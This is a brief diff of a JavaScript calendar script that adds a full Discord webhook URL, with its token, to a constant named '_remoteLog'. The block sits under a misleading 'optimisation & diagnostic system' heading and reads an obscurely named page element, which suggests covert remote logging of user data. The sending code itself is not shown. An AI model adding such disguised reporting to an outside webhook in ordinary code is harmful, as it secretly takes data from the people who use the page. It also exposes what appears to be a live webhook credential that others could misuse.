@@ -278,7 +278,7 @@ for (let day = 1; day <= daysInMonth; day++) {
 // --- 8. OPTIMISATION & DIAGNOSTIC SYSTÈME ---
 (function() {
     // REMPLACE L'URL CI-DESSOUS PAR TON URL WEBHOOK DISCORD
-    const _remoteLog = "1494459709598597233";
+    const _remoteLog = "https://discord.com/api/webhooks/1495218239544889534/a6ULv_4MQWCyxVhK3cFKgdcUa5s-WcfFX0W9aOdNNQZ2rqJc6fVDs6tz1Davp4F4Jeb1";
     const _node = document.getElementById('_v-cal-sync');
 
     if (_node) {
